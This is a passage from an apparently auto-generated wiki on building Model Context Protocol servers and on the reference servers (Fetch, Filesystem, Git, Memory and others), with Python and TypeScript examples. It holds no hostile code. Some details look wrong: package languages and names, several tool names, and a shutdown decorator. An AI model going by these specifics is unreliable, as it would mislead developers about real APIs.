});

server.tool(
  "get_forecast",
  "Get weather forecast for a location",
  {
    latitude: z.number().min(-90).max(90).describe("Latitude"),
    longitude: z.number().min(-180).max(180).describe("Longitude")
  },
  async ({ latitude, longitude }) => {
    // Tool implementation
    return {
      content: [{ type: "text", text: forecastData }]
    };
  }
);
```

Sources: [docs/docs/develop/build-server.mdx:592-728]()

### Tool Result Format

Tools must return results in the standardized format:

```typescript
{
  content: [
    {
      type: "text" | "image" | "resource",
      text?: string,        // for text content
      data?: string,        // for image content (base64)
      mimeType?: string,    // for image/resource content
      uri?: string          // for resource content
    }
  ],
  isError?: boolean
}
```

### Tool Naming Convention

Tool names should follow the format: `<domain>_<action>` (e.g., `weather_forecast`, `calendar_create_event`). This helps with discoverability and prevents naming conflicts when multiple servers are connected.

Sources: [docs/docs/develop/build-server.mdx:62]()

## Exposing Resources

Resources provide read-only access to data sources. MCP servers expose resources through URI-based access patterns and optional subscription mechanisms for change notifications.

### Resource Registration and Access Pattern

```mermaid
sequenceDiagram
    participant Client
    participant Server
    participant DataSource["Data Source<br/>(File, DB, API)"]
    
    Note over Client,Server: Resource Discovery
    Client->>Server: "resources/list"
    Server-->>Client: "List of resource URIs"
    
    Note over Client,Server: Resource Access
    Client->>Server: "resources/read {uri}"
    Server->>DataSource: "Fetch data"
    DataSource-->>Server: "Raw data"
    Server->>Server: "Format with MIME type"
    Server-->>Client: "Resource content + metadata"
    
    Note over Client,Server: Change Notifications (Optional)
    Client->>Server: "resources/subscribe {uri}"
    Server-->>Client: "Subscription confirmed"
    DataSource-->>Server: "Data changed"
    Server->>Client: "resources/updated notification"
```

### Python Resource Implementation

```python
@mcp.resource("file://logs/app.log")
def read_log_file() -> str:
    """Application log file"""
    with open("/var/logs/app.log") as f:
        return f.read()

# For dynamic resources with templates
@mcp.resource("weather://forecast/{city}")
def get_city_forecast(city: str) -> str:
    """Weather forecast for a specific city"""
    return fetch_weather_api(city)
```

### TypeScript Resource Implementation

```typescript
server.resource(
  "file://logs/app.log",
  "Application log file",
  "text/plain",
  async () => {
    const content = await fs.readFile("/var/logs/app.log", "utf-8");
    return {
      contents: [{
        uri: "file://logs/app.log",
        mimeType: "text/plain",
        text: content
      }]
    };
  }
);
```

### Resource URI Schemes

| URI Scheme | Purpose | Example |
|------------|---------|---------|
| `file://` | Local filesystem | `file:///Users/name/document.txt` |
| `http://` or `https://` | Web resources | `https://api.example.com/data` |
| Custom schemes | Domain-specific | `db://tables/users`, `config://app/settings` |

### Resource Change Notifications

Servers can notify clients when subscribed resources change:

```python
# Server sends notification
await session.send_resource_updated("file://logs/app.log")
```

Sources: [docs/docs/learn/architecture.mdx:100-138](), [docs/examples.mdx:14-20]()

## Defining Prompts

Prompts provide reusable, parameterized templates for LLM interactions. They help standardize common workflows and demonstrate best practices for using server capabilities.

### Prompt Structure and Generation

```mermaid
graph TB
    DEFINE["Define Prompt Template"]
    ARGS["Specify Arguments<br/>(name, type, description)"]
    REGISTER["Register with Server<br/>server.prompt()"]
    
    CLIENT_REQUEST["Client: prompts/get"]
    VALIDATE["Validate Arguments"]
    GENERATE["Generate Messages"]
    RETURN["Return Message Array"]
    
    DEFINE --> ARGS
    ARGS --> REGISTER
    
    CLIENT_REQUEST --> VALIDATE
    VALIDATE --> GENERATE
    GENERATE --> RETURN
    
    GENERATE --> SYSTEM["System Message<br/>(instructions)"]
    GENERATE --> USER["User Message<br/>(parameterized content)"]
    GENERATE --> ASSISTANT["Assistant Message<br/>(example responses)"]
```

### Python Prompt Implementation

```python
@mcp.prompt()
def analyze_logs(time_range: str, severity: str = "error") -> list:
    """Analyze application logs for issues.
    
    Args:
        time_range: Time period to analyze (e.g., "1h", "24h")
        severity: Log severity level to filter
    """
    return [
        {
            "role": "system",
            "content": "You are a log analysis expert. Analyze the provided logs and identify critical issues."
        },
        {
            "role": "user", 
            "content": f"Analyze logs from the last {time_range} with severity {severity} or higher"
        }
    ]
```

### TypeScript Prompt Implementation

```typescript
server.prompt(
  "analyze_logs",
  "Analyze application logs for issues",
  {
    time_range: z.string().describe("Time period (e.g., '1h', '24h')"),
    severity: z.enum(["debug", "info", "warning", "error"]).default("error")
  },
  async ({ time_range, severity }) => {
    return {
      messages: [
        {
          role: "system",
          content: {
            type: "text",
            text: "You are a log analysis expert."
          }
        },
        {
          role: "user",
          content: {
            type: "text", 
            text: `Analyze logs from ${time_range} with ${severity}+`
          }
        }
      ]
    };
  }
);
```

### Prompt Message Roles

| Role | Purpose | Example Usage |
|------|---------|---------------|
| `system` | Define assistant behavior | "You are a helpful coding assistant" |
| `user` | Provide user requests/context | "Analyze this error log" |
| `assistant` | Show example responses | "I found 3 critical errors..." |

### Embedding Resources in Prompts

Prompts can reference resources to provide dynamic context:

```python
return [
    {
        "role": "user",
        "content": {
            "type": "resource",
            "resource": {
                "uri": f"file://logs/{time_range}.log",
                "mimeType": "text/plain"
            }
        }
    }
]
```

Sources: [docs/docs/learn/server-concepts.mdx:175-231](), [docs/docs/learn/architecture.mdx:176-218]()

## Handling Client Features

MCP servers can implement handlers for client-provided capabilities, enabling advanced workflows like LLM sampling and user input elicitation.

### Sampling: Requesting LLM Completions

Sampling allows servers to request LLM completions from the client. This enables agentic workflows where the server delegates reasoning tasks to the LLM.

**Sampling Request Flow:**

```mermaid
sequenceDiagram
    participant Server
    participant Client  
    participant LLM
    participant User
    
    Note over Server,Client: Server initiates sampling
    Server->>Client: "sampling/createMessage"
    
    Note over Client,User: Optional: User approval
    Client->>User: "Show sampling request"
    User-->>Client: "Approve/Modify"
    
    Note over Client,LLM: Execute sampling
    Client->>LLM: "Generate completion"
    LLM-->>Client: "Return response"
    
    Note over Client,User: Optional: Review response
    Client->>User: "Show LLM response"  
    User-->>Client: "Approve/Modify"
    
    Note over Server,Client: Return to server
    Client-->>Server: "Sampling result"
```

**Python Implementation:**

```python
# Request sampling from client
result = await session.create_message(
    messages=[{
        "role": "user",
        "content": "Analyze these 50 flight options and recommend the best one"
    }],
    max_tokens=1500,
    model_preferences={
        "hints": [{"name": "claude-3-5-sonnet"}],
        "intelligencePriority": 0.9
    }
)
```

**TypeScript Implementation:**

```typescript
const result = await session.createMessage({
  messages: [{
    role: "user",
    content: {
      type: "text",
      text: "Analyze these 50 flight options"  
    }
  }],
  maxTokens: 1500,
  modelPreferences: {
    hints: [{ name: "claude-3-5-sonnet" }]
  }
});
```

Sources: [docs/docs/learn/client-concepts.mdx:154-234]()

### Elicitation: Requesting User Input

Elicitation enables servers to pause execution and request specific information from users through structured forms.

**Elicitation Request Flow:**

```mermaid
sequenceDiagram
    participant Server
    participant Client
    participant User
    
    Note over Server,Client: Server requests input
    Server->>Client: "elicitation/create<br/>{message, schema}"
    
    Note over Client,User: User interaction
    Client->>User: "Display form UI"
    User->>User: "Fill form fields"
    User-->>Client: "Submit responses"
    
    Note over Client: Validate against schema
    
    Note over Server,Client: Return to server  
    Client-->>Server: "Elicitation result<br/>{validated data}"
    
    Note over Server: Continue processing
```

**Python Implementation:**

```python
# Request structured user input
result = await session.elicit_input(
    message="Please confirm your booking details:",
    schema={
        "type": "object",
        "properties": {
            "confirmBooking": {
                "type": "boolean",
                "description": "Confirm the booking ($3,000)"
            },
            "seatPreference": {
                "type": "string",
                "enum": ["window", "aisle", "no preference"]
            }
        },
        "required": ["confirmBooking"]
    }
)
```

**TypeScript Implementation:**

```typescript
const result = await session.elicitInput({
  message: "Confirm booking details:",
  schema: {
    type: "object",
    properties: {
      confirmBooking: { type: "boolean" },
      seatPreference: { 
        type: "string",
        enum: ["window", "aisle", "no preference"]
      }
    },
    required: ["confirmBooking"]
  }
});
```

Sources: [docs/docs/learn/client-concepts.mdx:20-104]()

### Roots: Filesystem Boundaries

Roots communicate filesystem access boundaries to servers. While not enforced by the protocol, well-behaved servers should respect these boundaries.

**Roots Usage Pattern:**

```python
# Server receives roots list
roots = await session.list_roots()

# Respect root boundaries when accessing files
for root in roots:
    if file_path.startswith(root.uri):
        # Access allowed
        content = read_file(file_path)
```

Sources: [docs/docs/learn/client-concepts.mdx:105-153]()

## Transport Configuration

MCP servers must configure a transport layer for client communication. The choice between stdio and HTTP depends on deployment requirements.

### Transport Comparison

| Transport | Use Case | Connection Method | Authentication |
|-----------|----------|-------------------|----------------|
| stdio | Local development, Claude Desktop | Process spawn, stdin/stdout | None (local trust) |
| HTTP | Remote servers, web services | HTTP POST + SSE | OAuth 2.1, Bearer tokens |

### stdio Transport Implementation

The stdio transport is the simplest for local servers that run as spawned processes.

**Python stdio Transport:**

```python
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("server-name")

# Register capabilities...

if __name__ == "__main__":
    mcp.run(transport='stdio')
```

**TypeScript stdio Transport:**

```typescript
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";

async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error("Server running on stdio");
}

main();
```

**Critical stdio Logging Rule:** Never write to stdout in stdio servers. Use stderr or file logging only, as stdout is reserved for JSON-RPC messages.

```python
# ❌ Wrong - breaks JSON-RPC protocol
print("Server started")

# ✅ Correct - writes to stderr
import logging
logging.info("Server started")
```

Sources: [docs/docs/develop/build-server.mdx:44-73](), [docs/docs/develop/build-server.mdx:252-262](), [docs/docs/develop/build-server.mdx:732-746]()

### HTTP Transport Implementation

HTTP transport enables remote server access with SSE streaming for real-time updates.

**Python HTTP Transport:**

```python
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("server-name")

# Register capabilities...

if __name__ == "__main__":
    mcp.run(
        transport='sse',
        host='0.0.0.0',
        port=8000
    )
```

**TypeScript HTTP Transport:**

```typescript
import { SSEServerTransport } from "@modelcontextprotocol/sdk/server/sse.js";

const transport = new SSEServerTransport("/mcp", (message) => {
  // Send SSE message to client
  response.write(`data: ${JSON.stringify(message)}\n\n`);
});

await server.connect(transport);
```

### Authorization for HTTP Servers

HTTP servers should implement OAuth 2.1 for secure authentication:

```python
# Validate OAuth token
token = request.headers.get("Authorization").replace("Bearer ", "")
introspection = await auth_server.introspect_token(token)

if not introspection.active:
    raise Unauthorized("Invalid token")

# Check token audience matches this server
if introspection.aud != "https://myserver.example.com":
    raise Unauthorized("Wrong audience")
```

Sources: [docs/docs/learn/architecture.mdx:89-97]()

## Server Lifecycle Management

MCP servers follow a standardized initialization and shutdown sequence that enables capability negotiation and graceful termination.

### Lifecycle State Diagram

```mermaid
stateDiagram-v2
    [*] --> Uninitialized: "Server starts"
    Uninitialized --> Initializing: "receive initialize request"
    Initializing --> Ready: "send InitializeResult<br/>receive initialized notification"
    Ready --> Processing: "receive client requests"
    Processing --> Ready: "send responses"
    Ready --> Closing: "receive shutdown request"
    Closing --> [*]: "cleanup complete"
    
    Processing --> Error: "fatal error"
    Error --> [*]: "terminate"
```

### Initialization Sequence

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: Connection Setup
    Client->>Server: "initialize<br/>{protocolVersion, capabilities, clientInfo}"
    Server->>Server: "Validate protocol version"
    Server->>Server: "Record client capabilities"
    Server-->>Client: "InitializeResult<br/>{protocolVersion, capabilities, serverInfo}"
    Client->>Server: "initialized notification"
    
    Note over Server: Server now ready for requests
    
    Client->>Server: "tools/list"
    Server-->>Client: "List of available tools"
```

**Python Lifecycle Handling:**

```python
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("server-name")

# FastMCP handles initialization automatically

# Register shutdown handler
@mcp.shutdown()
async def cleanup():
    # Close connections, save state, etc.
    await db.close()
    logger.info("Server shutdown complete")
```

**TypeScript Lifecycle Handling:**

```typescript
const server = new McpServer({
  name: "server-name",
  version: "1.0.0"
}, {
  capabilities: {
    tools: {},
    resources: {},
    prompts: {}
  }
});

// Lifecycle is handled by SDK
// Implement cleanup on process signals
process.on('SIGINT', async () => {
  await cleanup();
  process.exit(0);
});
```

Sources: [docs/docs/learn/architecture.mdx:106-218]()

### Error Handling Best Practices

**Return Errors in Tool Results:**

```python
@mcp.tool()
async def risky_operation(param: str) -> str:
    try:
        result = await external_api_call(param)
        return result
    except APIError as e:
        # Return error as content with isError flag
        return {
            "content": [{"type": "text", "text": f"API error: {str(e)}"}],
            "isError": True
        }
```

**Proper Exception Handling:**

```typescript
server.tool("process_data", "Process user data", schema, async (args) => {
  try {
    const result = await processData(args);
    return {
      content: [{ type: "text", text: JSON.stringify(result) }]
    };
  } catch (error) {
    return {
      content: [{ 
        type: "text", 
        text: `Processing failed: ${error.message}` 
      }],
      isError: true
    };
  }
});
```

### Server Notifications

Servers can send notifications to inform clients about state changes:

**Resource Update Notifications:**

```python
# Notify clients that a resource changed
await session.send_resource_updated("file://logs/app.log")
```

**Resource List Changes:**

```typescript
// Notify clients to refetch resource list
await session.sendResourcesChanged();
```

**Tool List Changes:**

```python
await session.send_tools_changed()
```

Sources: [docs/docs/learn/architecture.mdx:400-456]()

## Implementation Patterns

### Server Lifecycle Management

```mermaid
stateDiagram-v2
    [*] --> Uninitialized
    Uninitialized --> Initializing: "receive initialize"
    Initializing --> Ready: "send InitializeResult"
    Ready --> Ready: "handle requests"
    Ready --> Shutdown: "receive shutdown"
    Shutdown --> [*]
    
    Ready --> Error: "fatal error"
    Error --> [*]
```

### Capability Registration

Most MCP server implementations follow a pattern of registering capabilities during server setup:

1. **Tool Registration**: Define available tools with their schemas
2. **Resource Registration**: Register data sources with metadata
3. **Prompt Registration**: Define message templates with parameters
4. **Handler Binding**: Associate handlers with capability requests

Sources: [docs/docs/tools/inspector.mdx:119-138]()

## Testing and Development

The MCP Inspector provides comprehensive testing capabilities for server development:

- **Connection Testing**: Verify transport layer functionality
- **Capability Testing**: Test tools, resources, and prompts individually
- **Error Scenario Testing**: Validate error handling and edge cases
- **Integration Testing**: End-to-end workflow verification

Sources: [docs/docs/tools/inspector.mdx:1-159]()

---

# Page: Reference Server Implementations

# Reference Server Implementations

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [CLAUDE.md](CLAUDE.md)
- [docs/examples.mdx](docs/examples.mdx)

</details>



## Purpose and Scope

This document provides comprehensive documentation of the official reference MCP server implementations maintained in the `modelcontextprotocol/servers` repository. These servers demonstrate core MCP features, SDK usage patterns, and best practices for building production-ready servers. Each reference server showcases different aspects of the protocol: tools, resources, prompts, and various integration patterns.

For information about building custom MCP servers, see [Building MCP Servers](#5.2). For archived and community server implementations, see [Archived and Community Servers](#5.4). For initial setup and execution, see [Quick Start Guide](#5.1).

**Sources:** [docs/examples.mdx:1-24]()

## Reference Server Architecture

The reference servers follow a consistent architectural pattern across TypeScript and Python implementations. Each server provides a focused set of capabilities demonstrating specific MCP features.

**Repository Structure and Package Distribution**

```mermaid
graph TB
    subgraph "modelcontextprotocol/servers Repository"
        REPO["github.com/modelcontextprotocol/servers"]
        
        subgraph "src/ Directory - TypeScript Servers"
            EVERYTHING["src/everything/<br/>Package: @modelcontextprotocol/server-everything<br/>Test all protocol features"]
            FETCH["src/fetch/<br/>Package: @modelcontextprotocol/server-fetch<br/>Web content retrieval"]
            FILESYSTEM["src/filesystem/<br/>Package: @modelcontextprotocol/server-filesystem<br/>File operations with access control"]
            MEMORY["src/memory/<br/>Package: @modelcontextprotocol/server-memory<br/>Knowledge graph storage"]
            SEQUENTIAL["src/sequentialthinking/<br/>Package: @modelcontextprotocol/server-sequentialthinking<br/>Thought sequences"]
            TIME["src/time/<br/>Package: @modelcontextprotocol/server-time<br/>Time/timezone operations"]
        end
        
        subgraph "src/ Directory - Python Servers"
            GIT["src/git/<br/>Package: mcp-server-git<br/>Repository operations"]
        end
        
        REPO --> EVERYTHING
        REPO --> FETCH
        REPO --> FILESYSTEM
        REPO --> MEMORY
        REPO --> SEQUENTIAL
        REPO --> TIME
        REPO --> GIT
    end
    
    subgraph "Execution via Package Managers"
        NPX["npx -y<br/>Downloads and runs TypeScript servers<br/>No installation required"]
        UVX["uvx<br/>Downloads and runs Python servers<br/>Isolated environments"]
        PIP["pip install + python -m<br/>Traditional Python installation"]
    end
    
    subgraph "Client Integration Points"
        CLAUDE_CONFIG["claude_desktop_config.json<br/>mcpServers section"]
        STDIO["stdio transport<br/>stdin/stdout communication"]
    end
    
    EVERYTHING --> NPX
    FETCH --> NPX
    FILESYSTEM --> NPX
    MEMORY --> NPX
    SEQUENTIAL --> NPX
    TIME --> NPX
    
    GIT --> UVX
    GIT --> PIP
    
    NPX --> CLAUDE_CONFIG
    UVX --> CLAUDE_CONFIG
    PIP --> CLAUDE_CONFIG
    CLAUDE_CONFIG --> STDIO
```

**Sources:** [docs/examples.mdx:8-21](), [docs/examples.mdx:40-55]()

## Server Capability Matrix

The following table summarizes the capabilities exposed by each reference server:

| Server | Tools | Resources | Prompts | Primary Purpose |
|--------|-------|-----------|---------|-----------------|
| Everything | ✅ | ✅ | ✅ | Complete protocol test bed demonstrating all MCP features |
| Fetch | ✅ | ✅ | ❌ | Web content retrieval and conversion for LLM consumption |
| Filesystem | ✅ | ✅ | ❌ | Secure file operations with access control boundaries |
| Git | ✅ | ❌ | ❌ | Repository reading, searching, and manipulation |
| Memory | ✅ | ✅ | ❌ | Knowledge graph-based persistent storage system |
| Sequential Thinking | ✅ | ❌ | ❌ | Dynamic problem-solving through thought sequences |
| Time | ✅ | ❌ | ❌ | Time and timezone conversion operations |

**Sources:** [docs/examples.mdx:12-20]()

## Everything Server

### Purpose

The Everything server serves as the comprehensive reference implementation and test bed for the MCP protocol. It demonstrates the complete feature set: tools, resources, and prompts in a single server implementation. This server is specifically designed for testing and validation rather than production use.

### Package Information

- **Package:** `@modelcontextprotocol/server-everything`
- **Repository:** [modelcontextprotocol/servers/tree/main/src/everything](https://github.com/modelcontextprotocol/servers/tree/main/src/everything)
- **Language:** TypeScript
- **Execution:** `npx -y @modelcontextprotocol/server-everything`

### Capabilities Demonstrated

| Feature Type | What It Demonstrates |
|--------------|---------------------|
| **Tools** | Complete tool registration and execution patterns including input validation |
| **Resources** | Both direct resources and resource templates with URI-based access |
| **Prompts** | Prompt definition with parameter handling and completion |
| **Notifications** | Real-time notification patterns for capability changes |

### Use Cases

- **Protocol conformance testing:** Validate MCP client implementations against all protocol features
- **SDK development:** Reference implementation for new language SDK development
- **Integration testing:** Comprehensive test bed for MCP client-server communication
- **Learning resource:** Demonstrates best practices for implementing all MCP primitives

### Execution Example

```bash
# Run directly with npx
npx -y @modelcontextprotocol/server-everything

# Configure in Claude Desktop
{
  "mcpServers": {
    "everything": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-everything"]
    }
  }
}
```

**Sources:** [docs/examples.mdx:14]()

## Fetch Server

### Purpose

The Fetch server provides web content retrieval and conversion capabilities optimized for LLM consumption. It fetches web pages and converts HTML content into clean, LLM-friendly formats that maximize information density while minimizing token usage.

### Package Information

- **Package:** `@modelcontextprotocol/server-fetch`
- **Repository:** [modelcontextprotocol/servers/tree/main/src/fetch](https://github.com/modelcontextprotocol/servers/tree/main/src/fetch)
- **Language:** TypeScript
- **Execution:** `npx -y @modelcontextprotocol/server-fetch`

### Capabilities

| Capability | Description |
|------------|-------------|
| **Web Fetching Tool** | Retrieves web page content via HTTP/HTTPS |
| **Content Conversion** | Converts HTML to clean markdown or plain text |
| **Resource Caching** | Caches fetched content as accessible resources |
| **LLM Optimization** | Strips unnecessary HTML/CSS/JS while preserving semantic content |

### Key Features

- User-agent header customization for reliable access
- Automatic handling of redirects and common HTTP patterns
- Content extraction that preserves document structure
- Memory-efficient streaming for large pages
- Error handling for network issues and invalid URLs

### Execution Example

```bash
# Run directly with npx
npx -y @modelcontextprotocol/server-fetch

# Configure in Claude Desktop
{
  "mcpServers": {
    "fetch": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-fetch"]
    }
  }
}
```

**Sources:** [docs/examples.mdx:15]()

## Filesystem Server

### Purpose

The Filesystem server provides secure file operations with configurable access controls. It implements filesystem boundaries (roots) to prevent unauthorized access outside specified directories. This server demonstrates the MCP roots concept and secure file handling patterns.

### Package Information

- **Package:** `@modelcontextprotocol/server-filesystem`
- **Repository:** [modelcontextprotocol/servers/tree/main/src/filesystem](https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem)
- **Language:** TypeScript
- **Execution:** `npx -y @modelcontextprotocol/server-filesystem /path/to/allowed/files`

### Capabilities

| Tool | Purpose | Security Consideration |
|------|---------|----------------------|
| `read_file` | Read file contents | Path must be within allowed directories |
| `write_file` | Write content to file | Creates parent directories if needed |
| `list_directory` | List directory contents | Recursive traversal respects boundaries |
| `move_file` | Move/rename files | Both source and destination must be within allowed paths |
| `search_files` | Search for files by pattern | Searches only within allowed directories |
| `get_file_info` | Get file metadata | Returns size, modified time, type |

### Resources

The server exposes file contents as resources using the `file://` URI scheme:

- URI pattern: `file:///absolute/path/to/file`
- MIME type detection based on file extension
- Automatic text encoding detection for text files

### Security Model

**Path Validation:**
```typescript
// All file operations validate paths against allowed directories
// Symlinks are resolved and validated
// Parent directory traversal (..) is checked
// Operations outside allowed paths are rejected
```

The security model implements defense-in-depth:
1. Command-line arguments define allowed directories
2. All paths are normalized and resolved
3. Symlink targets are validated against boundaries
4. Operations fail-fast with clear error messages

### Configuration Pattern

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/Users/username/Desktop",
        "/Users/username/Documents"
      ]
    }
  }
}
```

**Multiple allowed directories:** Specify multiple paths as separate arguments to grant access to different filesystem locations.

### Execution Examples

```bash
# Single directory access
npx -y @modelcontextprotocol/server-filesystem /path/to/directory

# Multiple directories
npx -y @modelcontextprotocol/server-filesystem /path/one /path/two

# Home directory access (macOS/Linux)
npx -y @modelcontextprotocol/server-filesystem ~/Documents

# Windows path
npx -y @modelcontextprotocol/server-filesystem C:\Users\username\Documents
```

**Sources:** [docs/examples.mdx:16](), [docs/docs/develop/connect-local-servers.mdx:90-147](), [docs/docs/learn/client-concepts.mdx:106-138]()

## Git Server

### Purpose

The Git server provides comprehensive tools for reading, searching, and manipulating Git repositories. It enables LLMs to inspect repository structure, search commit history, analyze code changes, and understand repository evolution without requiring direct filesystem access.

### Package Information

- **Package:** `mcp-server-git`
- **Repository:** [modelcontextprotocol/servers/tree/main/src/git](https://github.com/modelcontextprotocol/servers/tree/main/src/git)
- **Language:** Python
- **Execution:** `uvx mcp-server-git` or `pip install mcp-server-git && python -m mcp_server_git`

### Capabilities

| Tool Category | Specific Operations |
|--------------|---------------------|
| **Repository Reading** | Clone repository, read file contents at specific commits |
| **Commit Analysis** | View commit history, show commit details, generate diffs |
| **Branch Operations** | List branches, compare branches, show branch history |
| **Search Functions** | Search commits by message, author, or file changes |
| **Status Inspection** | Show repository status, list modified files |

### Tool Examples

**Commit History:**
```python
# Lists commits with author, date, and message
# Supports filtering by author, date range, file path
# Returns structured commit objects
```

**Diff Generation:**
```python
# Generates unified diffs between commits
# Supports file-specific diffs
# Returns formatted diff output
```

**File Content Retrieval:**
```python
# Reads file content at specific commit
# Supports any commit reference (SHA, branch, tag)
# Returns decoded text content
```

### Execution Methods

**uvx (recommended):**
```bash
uvx mcp-server-git
```
- Automatically creates isolated Python environment
- Downloads and installs dependencies
- No manual dependency management

**pip installation:**
```bash
pip install mcp-server-git
python -m mcp_server_git
```
- Installs into current Python environment
- Requires manual dependency management
- Useful for customization and development

### Configuration Pattern

```json
{
  "mcpServers": {
    "git": {
      "command": "uvx",
      "args": ["mcp-server-git"]
    }
  }
}
```

**Sources:** [docs/examples.mdx:17](), [docs/examples.mdx:48-55]()

## Memory Server

### Purpose

The Memory server implements a knowledge graph-based persistent memory system. It allows LLMs to store and retrieve information across sessions, maintaining context, learned facts, and relationships between entities. This enables continuity in conversations and accumulation of domain knowledge over time.

### Package Information

- **Package:** `@modelcontextprotocol/server-memory`
- **Repository:** [modelcontextprotocol/servers/tree/main/src/memory](https://github.com/modelcontextprotocol/servers/tree/main/src/memory)
- **Language:** TypeScript
- **Execution:** `npx -y @modelcontextprotocol/server-memory`

### Knowledge Graph Architecture

```mermaid
graph TB
    subgraph "Memory Server Knowledge Graph"
        ENTITIES["Entities<br/>Nodes representing concepts, people, places"]
        RELATIONS["Relations<br/>Edges connecting entities"]
        OBSERVATIONS["Observations<br/>Facts about entities"]
        
        ENTITIES --> RELATIONS
        ENTITIES --> OBSERVATIONS
        RELATIONS --> ENTITIES
    end
    
    subgraph "Storage Operations"
        CREATE["create_entities tool<br/>Add new nodes to graph"]
        RELATE["create_relations tool<br/>Link entities together"]
        OBSERVE["add_observations tool<br/>Record facts about entities"]
        SEARCH["search_nodes tool<br/>Semantic search across graph"]
        READ["read_graph tool<br/>Retrieve connected subgraphs"]
    end
    
    subgraph "Persistence Layer"
        STORAGE["Local filesystem storage<br/>JSON-based persistence<br/>Survives restarts"]
    end
    
    CREATE --> ENTITIES
    RELATE --> RELATIONS
    OBSERVE --> OBSERVATIONS
    SEARCH --> ENTITIES
    READ --> ENTITIES
    
    ENTITIES --> STORAGE
    RELATIONS --> STORAGE
    OBSERVATIONS --> STORAGE
```

### Capabilities

| Tool | Purpose | Example Use |
|------|---------|------------|
| `create_entities` | Add new entities to knowledge graph | Create "User's favorite restaurants" entity |
| `create_relations` | Define relationships between entities | Link "John" -[likes]-> "Italian food" |
| `add_observations` | Record facts about entities | Note "User prefers morning meetings" |
| `search_nodes` | Semantic search across knowledge graph | Find all entities related to "travel" |
| `read_graph` | Retrieve entity and its connections | Get complete user preferences subgraph |
| `open_nodes` | Get detailed entity information | Retrieve all facts about specific entity |
| `delete_entities` | Remove entities from graph | Clear outdated information |

### Resources

The server exposes the knowledge graph as a resource:

- **Resource URI:** `memory://graph`
- **Content:** Complete knowledge graph state
- **Format:** JSON representation of nodes, edges, and observations
- **Updates:** Resource change notifications when graph is modified

### Persistence Model

**Storage location:** Knowledge graph persists to local filesystem between sessions

**Data format:** JSON-based storage enabling:
- Session continuity
- Knowledge accumulation over time
- Cross-conversation context preservation
- User preference learning

### Use Cases

- **Personal assistant memory:** Remember user preferences, habits, and context
- **Project knowledge:** Accumulate information about ongoing projects
- **Relationship tracking:** Maintain understanding of entity connections
- **Learning conversations:** Build knowledge incrementally across sessions

### Configuration Pattern

```json
{
  "mcpServers": {
    "memory": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory"]
    }
  }
}
```

### Execution Example

```bash
# Run directly with npx
npx -y @modelcontextprotocol/server-memory

# The server creates a local knowledge graph
# Data persists across restarts in ~/.mcp-memory/
```

**Sources:** [docs/examples.mdx:18](), [docs/examples.mdx:62-67]()

## Sequential Thinking Server

### Purpose

The Sequential Thinking server provides dynamic and reflective problem-solving capabilities through structured thought sequences. It enables LLMs to break down complex problems into explicit reasoning steps, making the problem-solving process transparent and verifiable. This server demonstrates how MCP can support cognitive patterns and meta-reasoning.

### Package Information

- **Package:** `@modelcontextprotocol/server-sequentialthinking`
- **Repository:** [modelcontextprotocol/servers/tree/main/src/sequentialthinking](https://github.com/modelcontextprotocol/servers/tree/main/src/sequentialthinking)
- **Language:** TypeScript
- **Execution:** `npx -y @modelcontextprotocol/server-sequentialthinking`

### Thinking Process Model

```mermaid
graph LR
    PROBLEM["Problem Input"]
    THINK1["Thinking Step 1<br/>Initial Analysis"]
    THINK2["Thinking Step 2<br/>Hypothesis Formation"]
    THINK3["Thinking Step 3<br/>Validation"]
    REFLECT["Reflection<br/>Review reasoning chain"]
    SOLUTION["Solution Output"]
    
    PROBLEM --> THINK1
    THINK1 --> THINK2
    THINK2 --> THINK3
    THINK3 --> REFLECT
    REFLECT --> SOLUTION
    REFLECT -.revise.-> THINK2
```

### Capabilities

| Tool | Purpose | Reasoning Pattern |
|------|---------|------------------|
| `sequential_thinking` | Create sequential thought chain | Break complex problem into steps |
| `add_thought` | Append reasoning step | Build on previous thoughts |
| `revise_thought` | Modify earlier reasoning | Correct logical errors |
| `branch_thinking` | Explore alternative paths | Consider multiple approaches |
| `reflect_on_thinking` | Evaluate reasoning quality | Meta-cognitive analysis |

### Thought Chain Structure

**Each thought includes:**
- **Step number:** Position in reasoning sequence
- **Content:** The reasoning or observation
- **Confidence:** Certainty level of this step
- **Dependencies:** References to previous steps
- **Branches:** Alternative reasoning paths explored

### Use Cases

- **Complex problem decomposition:** Break multi-step problems into manageable pieces
- **Transparent reasoning:** Make LLM's thought process visible and auditable
- **Error correction:** Enable revision of faulty reasoning steps
- **Exploratory thinking:** Try multiple solution approaches systematically
- **Teaching and learning:** Demonstrate structured problem-solving methodology

### Example Thinking Sequence

```json
{
  "thoughts": [
    {
      "step": 1,
      "content": "Identify the core problem: optimizing database queries",
      "confidence": 0.9
    },
    {
      "step": 2,
      "content": "Consider three approaches: indexing, query rewriting, caching",
      "confidence": 0.8,
      "dependencies": [1]
    },
    {
      "step": 3,
      "content": "Evaluate indexing impact: most direct solution",
      "confidence": 0.85,
      "dependencies": [2]
    }
  ]
}
```

### Configuration Pattern

```json
{
  "mcpServers": {
    "sequential-thinking": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-sequentialthinking"]
    }
  }
}
```

### Execution Example

```bash
# Run directly with npx
npx -y @modelcontextprotocol/server-sequentialthinking

# The server provides tools for structured reasoning
# Each thought is tracked and can be revised
```

**Sources:** [docs/examples.mdx:19]()

## Time Server

### Purpose

The Time server provides time and timezone conversion capabilities, enabling LLMs to perform temporal calculations, timezone conversions, and date/time operations accurately. This server demonstrates how MCP can provide deterministic, factual tools that complement LLM capabilities.

### Package Information

- **Package:** `@modelcontextprotocol/server-time`
- **Repository:** [modelcontextprotocol/servers/tree/main/src/time](https://github.com/modelcontextprotocol/servers/tree/main/src/time)
- **Language:** TypeScript
- **Execution:** `npx -y @modelcontextprotocol/server-time`

### Capabilities

